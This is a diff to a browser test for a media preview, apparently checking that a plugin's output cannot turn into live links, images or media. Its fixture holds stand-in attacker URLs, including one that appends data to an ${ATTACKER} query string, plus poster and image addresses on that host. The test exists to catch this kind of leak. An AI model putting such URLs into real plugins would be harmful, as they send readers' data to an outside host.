@@ -17,6 +17,8 @@ const LEAK = `function render(f) {
   return '<p>https://${ATTACKER}/?d=' + d + '</p>'
     + '<p><code>@video{"https://youtu.be/AAAAAAAAAAA", poster="https://${ATTACKER}/p.png"}</code></p>'
     + '<ul><li>https://youtu.be/BBBBBBBBBBB</li><li>https://${ATTACKER}/q.png <code>poster</code></li></ul>'
+    + '<p><code>@image{https://${ATTACKER}/i.png, title="x", frame=mat}</code></p>'
+    + '<p><code>&gt;{"https://youtu.be/DDDDDDDDDDD", poster="https://${ATTACKER}/s.png"}</code></p>'
     + '<p><code>^{database}</code></p>';
 }
 export { render as default };
@@ -71,7 +73,10 @@ for (const [label, width, height] of [
 
 		// The plugin DREW, and its address is text.
 		await expect(plugin.locator('code').filter({ hasText: '@video{' })).toHaveCount(1);
-		await expect(plugin.locator('a[href], svg, .lat-icon, [data-lattice-media]')).toHaveCount(0);
+		// Slice 3's two new address forms, written by the plugin, stay text too: a picture record and the `>` clip.
+		await expect(plugin.locator('code').filter({ hasText: '@image{' })).toHaveCount(1);
+		await expect(plugin.locator('code').filter({ hasText: '>{' })).toHaveCount(1);
+		await expect(plugin.locator('a[href], svg, .lat-icon, [data-lattice-media], img, .lattice-bg')).toHaveCount(0);
 		// Nothing outside the plugin gained a figure; the author's own is whole.
 		const own = preview.locator('figure[data-lattice-media="video"]:not([data-lattice-plugin] *)');
 		await expect(own).toHaveCount(1);
